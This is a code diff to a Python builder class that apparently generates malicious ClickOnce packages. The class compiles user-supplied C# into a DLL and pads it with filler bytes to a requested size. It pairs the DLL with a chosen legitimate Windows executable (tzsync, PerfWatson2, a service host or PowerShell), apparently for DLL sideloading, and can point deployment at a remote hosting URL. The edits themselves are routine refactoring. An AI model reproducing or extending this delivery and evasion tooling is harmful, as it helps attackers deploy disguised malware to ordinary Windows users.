@@ -51,16 +51,24 @@ class CustomBuilder:
         shutil.copytree(SRC_TEMPLATE_DIR, self.temp_dir, dirs_exist_ok=True)
         self.logger.debug("Copied template files from %s to %s", SRC_TEMPLATE_DIR, self.temp_dir)
         if self.payload.icon:
+            try:
+                icon_bytes = b64decode(self.payload.icon)
+            except Exception:
+                raise Exception("icon: invalid base64 data")
             icon_path = os.path.join(self.temp_dir, "icon.ico")
             with open(icon_path, "wb") as f:
-                f.write(b64decode(self.payload.icon))
+                f.write(icon_bytes)
             self.logger.debug("Replaced icon.ico with custom upload")
 
     def write_user_program_cs(self):
         """Overwrite the template Program.cs with the user-supplied source."""
+        try:
+            program_cs_bytes = b64decode(self.payload.program_cs_b64)
+        except Exception:
+            raise Exception("program_cs_b64: invalid base64 data")
         program_cs = os.path.join(self.temp_dir, "Program.cs")
         with open(program_cs, "wb") as f:
-            f.write(b64decode(self.payload.program_cs_b64))
+            f.write(program_cs_bytes)
         self.logger.debug("Wrote user Program.cs (%d bytes)", os.stat(program_cs).st_size)
 
     def template_files(self):
@@ -78,15 +86,17 @@ class CustomBuilder:
             os.path.join(self.temp_dir, f"{self.payload.name}.application"),
         )
 
+        # Use a random namespace to avoid colliding with any namespace in the user's Program.cs
+        padding_ns = "__PB_" + "".join(random.choices(string.ascii_lowercase, k=10))
         data_cs_file = os.path.join(self.temp_dir, "Data.cs")
         with open(data_cs_file, "w") as f:
-            template_1 = """
-                namespace __Padding
-                {
+            template_1 = f"""
+                namespace {padding_ns}
+                {{
                     internal class Data
-                    {
+                    {{
                         private static readonly byte[] data = new byte[]
-                        {
+                        {{
                         """
             template_2 = """
                         };
@@ -110,13 +120,9 @@ class CustomBuilder:
         self.logger.debug("Generated Data.cs (%d bytes)", os.stat(data_cs_file).st_size)
 
     def compile_artefacts(self):
+        """Compile inside the temp dir without touching the process-global cwd."""
         self.logger.debug("Building artefacts with: %s", BUILD_CMD)
-        curr_dir = os.getcwd()
-        try:
-            os.chdir(self.temp_dir)
-            run_cmd_check_file(BUILD_CMD, self.tgt_dll, self.logger)
-        finally:
-            os.chdir(curr_dir)
+        run_cmd_check_file(BUILD_CMD, self.tgt_dll, self.logger, cwd=self.temp_dir)
 
     def inflate_artefact(self):
         extra_mb = self.payload.inflate - DATA_CS_SIZE_IN_MB
@@ -129,14 +135,17 @@ class CustomBuilder:
         self.logger.debug("Post-compile inflation complete; DLL size now %d bytes", os.stat(self.tgt_dll).st_size)
 
     def prepare_files_in_build_dir(self):
-        if self.payload.sideload.lower() == "tzsync":
+        sideload = self.payload.sideload.lower()
+        if sideload == "tzsync":
             self.sideload_exe = TZSYNC
-        if self.payload.sideload.lower() == "perfwatson2":
+        elif sideload == "perfwatson2":
             self.sideload_exe = PERFWATSON
-        if self.payload.sideload.lower() == "systemhost":
+        elif sideload == "systemhost":
             self.sideload_exe = SVCHUB
-        if self.payload.sideload.lower() == "powershell":
+        elif sideload == "powershell":
             self.sideload_exe = POWERSHELL
+        else:
+            raise Exception(f"Unhandled sideload target: {self.payload.sideload}")
 
         shutil.copy(self.sideload_exe.path, self.build_dir)
 
@@ -179,6 +188,17 @@ class CustomBuilder:
 
         with open(os.path.join(SRC_TEMPLATE_DIR, "project.application"), "r") as f:
             contents = f.read()
+
+        # Inject deploymentProvider if the user supplied a hosting URL
+        if self.payload.provider_url:
+            provider_url = self.payload.provider_url.rstrip("/")
+            codebase = f"{provider_url}/clickonce/{self.payload.name}.application"
+            contents = contents.replace(
+                '<deployment install="false" mapFileExtensions="true">',
+                '<deployment install="false" mapFileExtensions="true">\n'
+                f'    <deploymentProvider codebase="{codebase}" />',
+            )
+
         with open(os.path.join(self.build_dir, f"{self.payload.name}.application"), "w") as fw:
             fw.write(
                 Template(contents).safe_substitute(
@@ -272,3 +292,9 @@ def custom_build_func(buildid: str, payload: CustomPayload):
         GlobalLogger.error("Traceback: %s", traceback.format_exc())
         if builder is not None:
             builder.logger.error("Build failed: %s", e)
+    finally:
+        if builder is not None:
+            try:
+                builder._temp_dir.cleanup()
+            except Exception:  # pylint: disable=broad-except
+                pass
